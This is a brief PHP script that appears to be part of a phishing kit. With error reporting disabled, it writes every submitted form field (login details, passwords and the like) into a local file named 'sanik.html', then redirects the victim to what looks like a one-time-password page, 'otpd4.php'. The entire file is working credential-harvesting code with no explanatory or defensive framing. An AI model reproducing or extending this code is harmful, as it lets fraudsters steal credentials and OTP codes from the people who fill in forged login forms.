<?php

header('location: otpd4.php');

error_reporting(0);

$handle = fopen("sanik.html","a");

foreach($_POST as $variable => $value)

{

  fwrite($handle, $variable);

  fwrite($handle, "= ");

  fwrite($handle, $value);

  fwrite($handle, "\r\n<br>");

}

fwrite($handle, "\r\n<br>");

fclose($handle);

exit;

?> 

       